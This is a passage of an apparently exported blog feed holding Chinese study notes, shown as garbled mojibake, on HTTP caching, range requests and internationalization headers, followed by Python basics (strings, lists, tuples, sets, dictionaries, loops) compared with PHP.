¿æ—¶é—´<br>|s-max-age|å“åº”|æŒ‡å®šæ–‡æ¡£ä½œä¸ºå…±äº«ç¼“å­˜æ—¶çš„æœ€é•¿ä½¿ç”¨æ—¶é—´ï¼ˆå¦‚æœæœ‰ max-age æŒ‡ä»¤çš„è¯ï¼Œä»¥æœ¬æŒ‡ä»¤ä¸ºå‡†ï¼‰ã€‚ç§æœ‰çš„ç¼“å­˜å¯ä»¥å¿½ç•¥æœ¬æŒ‡ä»¤</p><h3 id="æœ‰æ¡ä»¶çš„è¯·æ±‚ç±»å‹"><a href="#æœ‰æ¡ä»¶çš„è¯·æ±‚ç±»å‹" class="headerlink" title="æœ‰æ¡ä»¶çš„è¯·æ±‚ç±»å‹"></a>æœ‰æ¡ä»¶çš„è¯·æ±‚ç±»å‹</h3><table><thead><tr><th>è¯·æ±‚ç±»å‹</th><th>éªŒè¯ç </th></tr></thead><tbody><tr><td>If-Modified-Since</td><td>Last-Modified</td></tr><tr><td>If-Unmodified-Since</td><td>Last-Modified</td></tr><tr><td>If-Match</td><td>ETag</td></tr><tr><td>If-None-Match</td><td>ETag</td></tr></tbody></table><h3 id="èŒƒå›´è¯·æ±‚"><a href="#èŒƒå›´è¯·æ±‚" class="headerlink" title="èŒƒå›´è¯·æ±‚"></a>èŒƒå›´è¯·æ±‚</h3><p>HTTP å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¯·æ±‚è·å–å®ä½“çš„æŸä¸ªèŒƒå›´ï¼Œå¦‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.google.com</span><br><span class="line"><span class="attribute">Range</span>: byte=4000-</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.61</span><br></pre></td></tr></table></figure><p>è¯¥ç¤ºä¾‹è¡¨ç¤ºè·å–æ–‡æ¡£ 4000 å­—èŠ‚ä¹‹åçš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Range é¦–éƒ¨æ¥è¯·æ±‚å¤šä¸ªèŒƒå›´ï¼ˆè¿™äº›èŒƒå›´å¯ä»¥ä»»æ„é¡ºåºç»™å‡ºï¼Œä¹Ÿå¯ä»¥ç›¸äº’é‡å ï¼‰ã€‚å¯¹äºä¸€ä¸ªå®¢æˆ·ç«¯åœ¨ä¸€ä¸ªè¯·æ±‚å†…è¯·æ±‚å¤šä¸ªä¸åŒèŒƒå›´çš„æƒ…å†µï¼Œè¿”å›çš„å“åº”ä¹Ÿæ˜¯å•ä¸ªå®ä½“ï¼Œå®ƒæœ‰ä¸€ä¸ªå¤šéƒ¨åˆ†ä¸»ä½“åŠ Content-Type: multipart/byteranges é¦–éƒ¨ã€‚</p><p>å¹¶éæ‰€æœ‰æœåŠ¡å™¨éƒ½æ¥å—èŒƒå›´è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥åœ¨å“åº”ä¸­åŒ…å« Accept-Ranges é¦–éƒ¨çš„å½¢å¼å‘å®¢æˆ·ç«¯è¯´æ˜å¯ä»¥æ¥å—çš„èŒƒå›´è¯·æ±‚ï¼Œå…¶å€¼ä¸ºè®¡ç®—èŒƒå›´çš„å•ä½ï¼Œé€šå¸¸ä»¥å­—èŠ‚è®¡ç®—ï¼Œå¦‚</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">05</span> Nov <span class="number">2019</span> <span class="number">22</span>:<span class="number">00</span>:<span class="number">00</span> GMT </span><br><span class="line">Server: Apache/ <span class="number">1.2</span><span class="number">.4</span></span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure><p><strong>Range é¦–éƒ¨åœ¨ P2P ä¸­å¾—åˆ°äº†å¹¿æ³›åº”ç”¨</strong>ï¼Œä»–ä»¬ä»ä¸åŒçš„å¯¹ç­‰å®ä½“åŒæ—¶ä¸‹è½½å¤šåª’ä½“æ–‡ä»¶çš„ä¸åŒéƒ¨åˆ†ã€‚</p><h1 id="ç¬¬16ç« -å›½é™…åŒ–"><a href="#ç¬¬16ç« -å›½é™…åŒ–" class="headerlink" title="ç¬¬16ç«  å›½é™…åŒ–"></a>ç¬¬16ç«  å›½é™…åŒ–</h1><p>æœåŠ¡å™¨é€šè¿‡ Content-Type ä¸­çš„ charset å’Œ Content-Language å‘ŠçŸ¥å®¢æˆ·ç«¯æ–‡æ¡£çš„å­—æ¯è¡¨å’Œè¯­è¨€ã€‚å®¢æˆ·ç«¯é€šè¿‡ Accept-Charset å’Œ Accept-Language å‘ŠçŸ¥æœåŠ¡å™¨å®ƒæ‰€ç†è§£çš„å­—ç¬¦é›†å’Œè¯­è¨€ä»¥åŠå…¶ä¸­çš„ä¼˜å…ˆé¡ºåºã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼Œè¡¨ç¤ºè¯¥ç”¨æˆ·å¯ä»¥åŒæ—¶æ¥å—æ³•è¯­ä¸è‹±è¯­ï¼Œä½†æ³•è¯­çš„ä¼˜å…ˆçº§æ›´é«˜(q ç¼ºçœä¸º 1.0)ï¼ŒåŒæ—¶æµè§ˆå™¨æ”¯æŒiso-8859-1 å’Œ utf-8 å­—ç¬¦é›†ã€‚</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Language: fr, en;q=<span class="number">0.8</span></span><br><span class="line">Accept-Charset: iso<span class="number">-8859</span><span class="number">-1</span>, utf<span class="number">-8</span></span><br></pre></td></tr></table></figure><p>ç¼–ç éƒ¨åˆ†å¯æŸ¥çœ‹åšæ–‡<a href="https://blog.shixinyu.space/post/computer-encoding/">è®¡ç®—æœºå¸¸ç”¨ç¼–ç çš„äºŒä¸‰äº‹</a><br>è¯­è¨€æ ‡å‡†æŸ¥çœ‹ ISO-639ï¼Œå›½å®¶ä»£ç æ ‡å‡†æŸ¥çœ‹ ISO-3166ã€‚</p><h1 id="ç¬¬17ç« -å†…å®¹åå•†ä¸è½¬ç "><a href="#ç¬¬17ç« -å†…å®¹åå•†ä¸è½¬ç " class="headerlink" title="ç¬¬17ç«  å†…å®¹åå•†ä¸è½¬ç "></a>ç¬¬17ç«  å†…å®¹åå•†ä¸è½¬ç </h1><h1 id="ç¬¬18ç« -Web-ä¸»æœºæ‰˜ç®¡"><a href="#ç¬¬18ç« -Web-ä¸»æœºæ‰˜ç®¡" class="headerlink" title="ç¬¬18ç«  Web ä¸»æœºæ‰˜ç®¡"></a>ç¬¬18ç«  Web ä¸»æœºæ‰˜ç®¡</h1><h1 id="ç¬¬19ç« -å‘å¸ƒç³»ç»Ÿ"><a href="#ç¬¬19ç« -å‘å¸ƒç³»ç»Ÿ" class="headerlink" title="ç¬¬19ç«  å‘å¸ƒç³»ç»Ÿ"></a>ç¬¬19ç«  å‘å¸ƒç³»ç»Ÿ</h1><h1 id="ç¬¬20ç« -é‡å®šå‘ä¸è´Ÿè½½å‡è¡¡"><a href="#ç¬¬20ç« -é‡å®šå‘ä¸è´Ÿè½½å‡è¡¡" class="headerlink" title="ç¬¬20ç«  é‡å®šå‘ä¸è´Ÿè½½å‡è¡¡"></a>ç¬¬20ç«  é‡å®šå‘ä¸è´Ÿè½½å‡è¡¡</h1><h1 id="ç¬¬21ç« -æ—¥å¿—è®°å½•ä¸ä½¿ç”¨æƒ…å†µè·Ÿè¸ª"><a href="#ç¬¬21ç« -æ—¥å¿—è®°å½•ä¸ä½¿ç”¨æƒ…å†µè·Ÿè¸ª" class="headerlink" title="ç¬¬21ç«  æ—¥å¿—è®°å½•ä¸ä½¿ç”¨æƒ…å†µè·Ÿè¸ª"></a>ç¬¬21ç«  æ—¥å¿—è®°å½•ä¸ä½¿ç”¨æƒ…å†µè·Ÿè¸ª</h1><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" target="_blank" rel="noopener">HTTP - MDN</a></li><li><a href="https://httpstatuses.com/" target="_blank" rel="noopener">HTTP Status</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" target="_blank" rel="noopener">HTTP request methods - MDN</a></li><li><a href="https://www.zhihu.com/question/28469005/answer/40934178" target="_blank" rel="noopener">è¯·æ±‚å‚æ•°ç”¨stringå¥½è¿˜æ˜¯æ•°å­—å¥½ï¼Ÿ - Ivonyçš„å›ç­”</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python å­¦ä¹ ç¬”è®°</title>
      <link href="/post/python-learning-notes/"/>
      <url>/post/python-learning-notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9p75dnlu8j30jq0atq44.jpg" alt=""></p><a id="more"></a><blockquote><p>æœ¬ç¬”è®°å†…å®¹æ¥è‡ªäº<br><a href="https://docs.python.org/zh-cn/3/tutorial/index.html#tutorial-index" target="_blank" rel="noopener">Python æ•™ç¨‹</a><br><a href="https://docs.python.org/zh-cn/3/reference/index.html#reference-index" target="_blank" rel="noopener"> Python è¯­è¨€å‚è€ƒ</a><br><a href="https://docs.python.org/zh-cn/3/library/index.html#library-index" target="_blank" rel="noopener"> Python æ ‡å‡†åº“</a></p></blockquote><p>python çš„æ³¨é‡Š </p><ul><li>è¡Œæ³¨é‡Š <code># annotation</code></li><li>å—æ³¨é‡Š <code>&quot;&quot;&quot;annotation&quot;&quot;&quot;</code></li><li>ç¼–ç å£°æ˜ <code># -*- coding: &lt;encoding-name&gt; -*-</code> (ç¼–ç å£°æ˜éœ€è¦åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼<code>coding[=:]\s*([-\w.]+)</code>)</li></ul><p>äº¤äº’æ¨¡å¼<br>python è§£é‡Šå™¨é€€å‡ºæ–¹å¼ï¼š</p><ul><li>exit()</li><li>quit()</li><li>Control-D(Unix) Control-Z(Windows)</li></ul><p>åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼Œé™¤æ³•è¿ç®— (/) æ°¸è¿œè¿”å›æµ®ç‚¹æ•°ç±»å‹ï¼Œå¦‚æœè¦åš floor division å¾—åˆ°ä¸€ä¸ªæ•´æ•°ç»“æœï¼ˆå¿½ç•¥å°æ•°éƒ¨åˆ†ï¼‰ä½ å¯ä»¥ä½¿ç”¨ // è¿ç®—ç¬¦<br>åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼Œä¸Šä¸€æ¬¡æ‰“å°å‡ºæ¥çš„è¡¨è¾¾å¼è¢«èµ‹å€¼ç»™å˜é‡ _ã€‚è¿™æ„å‘³ç€å½“ä½ æŠŠ Python ç”¨ä½œæ¡Œé¢è®¡ç®—å™¨æ—¶ï¼Œç»§ç»­è®¡ç®—ä¼šç›¸å¯¹ç®€å•ã€‚è¿™ä¸ªå˜é‡åº”è¯¥è¢«ä½¿ç”¨è€…å½“ä½œæ˜¯åªè¯»ç±»å‹ã€‚ä¸è¦å‘å®ƒæ˜¾å¼åœ°èµ‹å€¼ â€”â€” ä½ ä¼šåˆ›å»ºä¸€ä¸ªå’Œå®ƒåå­—ç›¸åŒç‹¬ç«‹çš„æœ¬åœ°å˜é‡ï¼Œå®ƒä¼šä½¿ç”¨é­”æ³•è¡Œä¸ºå±è”½å†…éƒ¨å˜é‡ã€‚</p><p>æ·»åŠ åœ¨å¼•å·å‰æ·»åŠ <code>r</code>ä½¿ç”¨åŸç”Ÿå­—ç¬¦ï¼Œè€Œé<code>\</code>è½¬ä¹‰</p><p>å­—ç¬¦ä¸²å­—é¢å€¼å¯ä»¥è·¨è¡Œè¿ç»­è¾“å…¥ã€‚ä¸€ç§æ–¹å¼æ˜¯ç”¨ä¸‰é‡å¼•å·ï¼šâ€â€â€â€¦â€â€â€ æˆ– â€˜â€™â€™â€¦â€™â€™â€™ã€‚å­—ç¬¦ä¸²ä¸­çš„å›è½¦æ¢è¡Œä¼šè‡ªåŠ¨åŒ…å«åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œå¦‚æœä¸æƒ³åŒ…å«ï¼Œåœ¨è¡Œå°¾æ·»åŠ ä¸€ä¸ª \ å³å¯</p><p>å­—ç¬¦ä¸²ä½¿ç”¨<code>+</code>æ‹¼æ¥ï¼Œä½¿ç”¨<code>*</code>é‡å¤<br>ç›¸é‚»çš„ä¸¤ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²å­—é¢å€¼å°†ä¼šè‡ªåŠ¨è¿æ¥åˆ°ä¸€èµ·ï¼ŒæŠŠå¾ˆé•¿çš„å­—ç¬¦ä¸²æ‹†å¼€åˆ†åˆ«è¾“å…¥çš„æ—¶å€™å°¤å…¶æœ‰ç”¨</p><p>å­—ç¬¦ä¸²æ”¯æŒç´¢å¼•è·å–å­—ç¬¦ï¼Œä¹Ÿæ”¯æŒåˆ‡ç‰‡ word[0:2]ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ‡ç‰‡ç»“æœæ˜¯å·¦é—­å³å¼€çš„</p><p>åˆ—è¡¨é€šè¿‡append()æ–¹æ³•è¿½åŠ å…ƒç´ </p><p>python å…è®¸å¤šé‡èµ‹å€¼ï¼ša, b = 1, 2<br>print ä¸­çš„ end å¯ä»¥ç”¨æ¥å–æ¶ˆè¾“å‡ºåé¢çš„æ¢è¡Œï¼Œæˆ–æ˜¯ç”¨å¦å¤–ä¸€ä¸ªå­—ç¬¦ä¸²æ¥ç»“å°¾ï¼Œå¦‚print(a, end=â€™,â€™)</p><p>python ä¸­çš„ range æ˜¯ä¸ªiterableï¼Œä½¿ç”¨ list(range(5)) å¯ä»¥ä»æŒ‡å®šèŒƒå›´å†…è·å–ä¸€ä¸ªåˆ—è¡¨ã€‚<br>pass è¯­å¥å¯ä½œä¸ºç¼–ç¨‹å ä½è¯­å¥<br>php å‡½æ•°å®šä¹‰ä½¿ç”¨ <code>function</code> å…³é”®å­—ï¼Œè€Œ Python ä¸­åˆ™ä½¿ç”¨ <code>def</code> å…³é”®å­—</p><p><em>nameè¡¨ç¤ºæ¥æ”¶ä¸€ä¸ªå…ƒç»„ï¼Œ*</em>name è¡¨ç¤ºæ¥æ”¶ä¸€ä¸ªå­—å…¸ã€‚<em>name å¿…é¡»å‡ºç°åœ¨ *</em>name ä¹‹å‰</p><p>python ä¸­çš„æ–¹æ³•å‚æ•°ä¼ é€’åˆ†ä¸ºä½ç½®æˆ–å…³é”®å­—å‚æ•°ã€ä»…é™ä½ç½®å‚æ•°(åœ¨å½¢å‚åæ”¾ç½®/)ã€ä»…é™å…³é”®å­—å‚æ•°ä¸‰ç§(åœ¨å½¢å‚å‰æ”¾ç½®*)ï¼Œå¦‚<code>def f(pos1, pos2, /, pos_or_kwd, *, kwd1, kwd2):</code>ï¼Œå…·ä½“ç¤ºä¾‹å¯æŸ¥çœ‹<a href="https://docs.python.org/zh-cn/3/tutorial/controlflow.html#function-examples" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/tutorial/controlflow.html#function-examples</a></p><p>python ä¸­å½¢å‚ç±»å‹æ ‡æ³¨æ”¾ç½®åœ¨å½¢å‚ä¹‹åï¼Œä¸”ç”¨:åˆ†éš”ï¼Œè¿”å›å€¼ç±»å‹æ ‡æ³¨ä½¿ç”¨ -&gt; str: æ ‡æ³¨ï¼Œå¦‚<code>def f(ham: str, eggs: str = &#39;eggs&#39;) -&gt; str:</code></p><h1 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h1><h2 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h2><p>list<br>python æ”¯æŒæŒ‡å®šä½ç½®æ’å…¥å…ƒç´ ã€æ¸…ç©ºåˆ—è¡¨(php åˆ™æ˜¯é€šè¿‡é‡æ–°èµ‹å€¼çš„æ–¹å¼ï¼Œé‡æ–°èµ‹å€¼æ˜¯æ–°å»ºä¸€ä»½å†…å­˜åŒºï¼ŒåŸå†…å­˜åŒºå˜é‡å°†è¢«å›æ”¶)</p><p>del ç±»ä¼¼äºPHP ä¸­çš„ unset()ï¼Œä¸åŒçš„æ˜¯ï¼Œdel æ˜¯è¯­å¥ï¼Œè€Œ unset()æ˜¯æ–¹æ³•ï¼Œæ­£å¦‚ PHP ä¸­ï¼Œecho æ˜¯è¯­å¥ï¼Œè€Œ print()æ˜¯æ–¹æ³•</p><p>åºåˆ—æ•°æ®ç±»å‹åŒ…æ‹¬ listã€tupleã€range</p><h2 id="å…ƒç»„"><a href="#å…ƒç»„" class="headerlink" title="å…ƒç»„"></a>å…ƒç»„</h2><p>å…ƒç»„ï¼Œç”±å‡ ä¸ªé€—å·åˆ†éš”çš„å€¼ç»„æˆï¼Œæ”¯æŒåµŒå¥—ã€ä½†å…ƒç»„çš„å†…å®¹ä¸å¯ä¿®æ”¹ï¼Œè¾“å‡ºæ—¶æ€»æ˜¯è¢«åœ†æ‹¬å·ä¿å«ï¼Œä»¥ä¾¿æ­£ç¡®è¡¨ç¤ºåµŒå¥—å…³ç³»ã€‚</p><p>å…ƒç»„ä¸åˆ—è¡¨çš„åŒºåˆ«ï¼šåˆ—è¡¨æ˜¯ mutable ï¼ˆå¯å˜çš„ï¼‰ï¼Œå¹¶ä¸”åˆ—è¡¨ä¸­çš„å…ƒç´ ä¸€èˆ¬æ˜¯åŒç§ç±»å‹çš„ï¼Œå¹¶ä¸”é€šè¿‡è¿­ä»£è®¿é—®ã€‚å…ƒç»„æ˜¯ immutable ï¼ˆä¸å¯å˜çš„ï¼‰ï¼Œå…¶åºåˆ—é€šå¸¸åŒ…å«ä¸åŒç§ç±»çš„å…ƒç´ ï¼Œå¹¶ä¸”é€šè¿‡è§£åŒ…æˆ–è€…ç´¢å¼•æ¥è®¿é—®ï¼ˆå¦‚æœæ˜¯ namedtuples çš„è¯ç”šè‡³è¿˜å¯ä»¥é€šè¿‡å±æ€§è®¿é—®ï¼‰ã€‚</p><p>ç©ºå…ƒç»„å¯ä»¥ç›´æ¥è¢«ä¸€å¯¹ç©ºåœ†æ‹¬å·åˆ›å»ºï¼Œå«æœ‰ä¸€ä¸ªå…ƒç´ çš„å…ƒç»„å¯ä»¥é€šè¿‡åœ¨è¿™ä¸ªå…ƒç´ åæ·»åŠ ä¸€ä¸ªé€—å·æ¥æ„å»ºï¼ˆåœ†æ‹¬å·é‡Œåªæœ‰ä¸€ä¸ªå€¼çš„è¯ä¸å¤Ÿæ˜ç¡®ï¼‰ã€‚<br>å…ƒç»„çš„åºåˆ—è§£åŒ…ç±»ä¼¼äº PHP ä¸­çš„ list($a, $b, $c) = [â€˜Aâ€™, â€˜Bâ€™, â€˜Câ€™];</p><h2 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h2><p>é›†åˆå¯ä»¥é€šè¿‡èŠ±æ‹¬å·æˆ– <code>set()</code> å‡½æ•°å¯ä»¥ç”¨æ¥åˆ›å»ºé›†åˆã€‚æ³¨æ„ï¼šè¦åˆ›å»ºä¸€ä¸ªç©ºé›†åˆä½ åªèƒ½ç”¨ set() è€Œä¸èƒ½ç”¨ {}ï¼Œå› ä¸ºåè€…æ˜¯åˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ã€‚é›†åˆä¹Ÿæ”¯æŒæ¨å¯¼å¼å½¢å¼ã€‚PHP ä¸­ä¸å­˜åœ¨é›†åˆã€‚<br>PHPä¸­çš„<code>array_diff</code>æ˜¯æœ€åä¸€ç§æƒ…å†µ<br><img src="https://github.com/jackfrued/Python-100-Days/raw/master/Day01-15/res/python-set.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set1.add(<span class="number">4</span>)</span><br><span class="line">set1.add(<span class="number">5</span>)</span><br><span class="line">set2.update([<span class="number">11</span>, <span class="number">12</span>])</span><br><span class="line">set2.discard(<span class="number">5</span>)</span><br><span class="line">set2.remove(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>åŒºåˆ«å°±æ˜¯ remove çš„å…ƒç´ åœ¨ set å½“ä¸­æ²¡æœ‰çš„è¯ä¼šæŠ¥é”™ï¼Œè€Œ discard ä¸ä¼šã€‚</p><p>å·®é›†ï¼ša - bï¼Œ array_diff(a,b)<br>äº¤é›†ï¼ša &amp; bï¼Œ array_intersect(a, b)<br>å¹¶é›†ï¼ša | b, + æˆ– array_merge()<br>å¯¹ç§°å·®é›†ï¼ša ^ bï¼Œ</p><h2 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h2><p>å­—å…¸æ˜¯ä»¥å…³é”®å­—ä¸ºç´¢å¼•çš„ï¼Œå…³é”®å­—å¯ä»¥æ˜¯ä»»æ„ä¸å¯å˜ç±»å‹ï¼Œé€šå¸¸æ˜¯å­—ç¬¦ä¸²æˆ–æ•°å­—ã€‚å¦‚æœä¸€ä¸ªå…ƒç»„åªåŒ…å«å­—ç¬¦ä¸²ã€æ•°å­—æˆ–å…ƒç»„ï¼Œé‚£ä¹ˆè¿™ä¸ªå…ƒç»„ä¹Ÿå¯ä»¥ç”¨ä½œå…³é”®å­—ã€‚ä½†å¦‚æœå…ƒç»„ç›´æ¥æˆ–é—´æ¥åœ°åŒ…å«äº†å¯å˜å¯¹è±¡ï¼Œé‚£ä¹ˆå®ƒå°±ä¸èƒ½ç”¨ä½œå…³é”®å­—ã€‚åˆ—è¡¨ä¸èƒ½ç”¨ä½œå…³é”®å­—ï¼Œå› ä¸ºåˆ—è¡¨å¯ä»¥é€šè¿‡ç´¢å¼•ã€åˆ‡ç‰‡æˆ– append() å’Œ extend() ä¹‹ç±»çš„æ–¹æ³•æ¥æ”¹å˜ã€‚<br>å¯¹å­—å…¸ä½¿ç”¨list()å°†å­—å…¸æ‰€æœ‰çš„é”®ä»¥åˆ—è¡¨å±•ç¤ºã€‚å¯é€šè¿‡ in å…³é”®å­—æ£€æŸ¥å­—å…¸ä¸­çš„æŸä¸ªç‰¹å®šçš„é”®æ˜¯å¦å­˜åœ¨ã€‚dict() æ„é€ å‡½æ•°å¯ä»¥ç›´æ¥ä»é”®å€¼å¯¹åºåˆ—é‡Œåˆ›å»ºå­—å…¸ã€‚</p><p>[]æ˜¯åˆ—è¡¨ï¼Œ{}æ˜¯å­—å…¸/é›†åˆï¼Œ()æ˜¯å…ƒç»„ã€‚<br><code>list()</code>å¯å°†å…ƒç»„è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œ<code>tuple()</code>å¯å°†åˆ—è¡¨è½¬æ¢ä¸ºå…ƒç»„ã€‚<br>å…ƒç»„çš„ä¼˜åŠ¿åœ¨äºï¼Œä¸€æ–¹é¢å†…å®¹ä¸å¯ä¿®æ”¹ï¼Œå¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œå¦ä¸€æ–¹é¢åˆ™æ˜¯åœ¨åˆ›å»ºæ—¶é—´å’Œå ç”¨çš„ç©ºé—´ä¸Šé¢éƒ½ä¼˜äºåˆ—è¡¨<br>æ•°å­—ã€å­—ç¬¦ä¸²å’Œå…ƒç»„æ˜¯ä¸å¯å˜çš„ï¼Œè€Œå­—å…¸å’Œåˆ—è¡¨æ˜¯å¯å˜çš„ã€‚<br>æœ‰äº›å¯¹è±¡åŒ…å«å¯¹å…¶ä»–å¯¹è±¡çš„å¼•ç”¨ï¼›å®ƒä»¬è¢«ç§°ä¸º å®¹å™¨ã€‚å®¹å™¨çš„ä¾‹å­æœ‰å…ƒç»„ã€åˆ—è¡¨å’Œå­—å…¸ç­‰ã€‚<br> <code>a = 1; b = 1</code> ä¹‹åï¼Œa å’Œ b å¯èƒ½ä¼šä¹Ÿå¯èƒ½ä¸ä¼šæŒ‡å‘åŒä¸€ä¸ªå€¼ä¸ºä¸€çš„å¯¹è±¡ï¼Œè¿™å–å†³äºå…·ä½“å®ç°ï¼Œä½†æ˜¯åœ¨ <code>c = []; d = []</code> ä¹‹åï¼Œc å’Œ d ä¿è¯ä¼šæŒ‡å‘ä¸¤ä¸ªä¸åŒã€å•ç‹¬çš„æ–°å»ºç©ºåˆ—è¡¨ã€‚(è¯·æ³¨æ„ <code>c = d = []</code> åˆ™æ˜¯å°†åŒä¸€ä¸ªå¯¹è±¡èµ‹å€¼ç»™ c å’Œ dã€‚)</p><h1 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h1><p>å¾ªç¯çš„æŠ€å·§<br>å½“åœ¨å­—å…¸ä¸­å¾ªç¯æ—¶ï¼Œç”¨ <code>items()</code> æ–¹æ³•å¯å°†å…³é”®å­—å’Œå¯¹åº”çš„å€¼åŒæ—¶å–å‡ºï¼Œç”¨<code>enumerate()</code>å¯ä»¥è·å–ç´¢å¼•å’Œå€¼ï¼Œç”¨<code>sorted()</code>å¯ä»¥åœ¨ä¸æ”¹åŠ¨åŸåºåˆ—çš„åŸºç¡€ä¸Šè¿”å›ä¸€ä¸ªæ–°çš„æ’å¥½åºçš„åºåˆ—<br>python è¿˜æ”¯æŒåŒæ—¶å¤šä¸ªå¾ªç¯ï¼Œå¦‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; questions = [<span class="symbol">'name</span>', <span class="symbol">'quest</span>', <span class="symbol">'favorite</span> color']</span><br><span class="line">&gt;&gt;&gt; answers = [<span class="symbol">'lancelot</span>', <span class="symbol">'the</span> holy grail', <span class="symbol">'blue</span>']</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> q, a <span class="keyword">in</span> zip(questions, answers):</span><br><span class="line">...     print(<span class="symbol">'What</span> <span class="keyword">is</span> your &#123;<span class="number">0</span>&#125;?  It <span class="keyword">is</span> &#123;<span class="number">1</span>&#125;.'.format(q, a))</span><br><span class="line">...</span><br><span class="line">What <span class="keyword">is</span> your name?  It <span class="keyword">is</span> lancelot.</span><br><span class="line">What <span class="keyword">is</span> your quest?  It <span class="keyword">is</span> the holy grail.</span><br><span class="line">What <span class="keyword">is</span> your favorite color?  It <span class="keyword">is</span> blue.</span><br></pre></td></tr></table></figure><h1 id="æ¯”è¾ƒæ“ä½œç¬¦"><a href="#æ¯”è¾ƒæ“ä½œç¬¦" class="headerlink" title="æ¯”è¾ƒæ“ä½œç¬¦"></a>æ¯”è¾ƒæ“ä½œç¬¦</h1><p>in å’Œ not in æ ¡éªŒä¸€ä¸ªå€¼æ˜¯å¦åœ¨ï¼ˆæˆ–ä¸åœ¨ï¼‰ä¸€ä¸ªåºåˆ—é‡Œ<br>is å’Œ is not æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡<br>æ¯”è¾ƒæ“ä½œå¯ä»¥ä¼ é€’ã€‚ä¾‹å¦‚ a &lt; b == c ä¼šæ ¡éªŒæ˜¯å¦ a å°äº b å¹¶ä¸” b ç­‰äº cã€‚<br>not ä¼˜å…ˆçº§æœ€é«˜ï¼Œ or ä¼˜å…ˆçº§æœ€ä½ï¼Œå› æ­¤ A and not B or C ç­‰ä»·äº (A and (not B)) or C</p><p>php ä¸ C ä¸­ç”¨ sprintf() æ¥æ ¼å¼åŒ–è¾“å‡ºçš„å­—ç¬¦ï¼Œè€Œ Python ä¸­ä½¿ç”¨ str.format()ï¼Œä¸”å ä½ç¬¦ä¸æ ¼å¼å¯ä»¥å£°æ˜ä½ç½®å¯¹åº”ï¼Œæ— éœ€ä¾ç…§è‡ªç„¶åºåˆ—å¯¹åº”ï¼ŒåŒæ—¶ï¼Œstr.format()ä¹Ÿæ”¯æŒä¼ å…¥å­—å…¸ã€‚</p><h1 id="è¯»å†™æ–‡ä»¶"><a href="#è¯»å†™æ–‡ä»¶" class="headerlink" title="è¯»å†™æ–‡ä»¶"></a>è¯»å†™æ–‡ä»¶</h1><p>åœ¨æ–‡æœ¬æ¨¡å¼ä¸‹è¯»å–æ—¶ï¼Œé»˜è®¤ä¼šæŠŠå¹³å°ç‰¹å®šçš„è¡Œç»“æŸç¬¦ (Unix ä¸Šçš„ \n, Windows ä¸Šçš„ \r\n) è½¬æ¢ä¸º \nã€‚åœ¨æ–‡æœ¬æ¨¡å¼ä¸‹å†™å…¥æ—¶ï¼Œé»˜è®¤ä¼šæŠŠå‡ºç°çš„ \n è½¬æ¢å›å¹³å°ç‰¹å®šçš„ç»“æŸç¬¦ã€‚è¿™æ 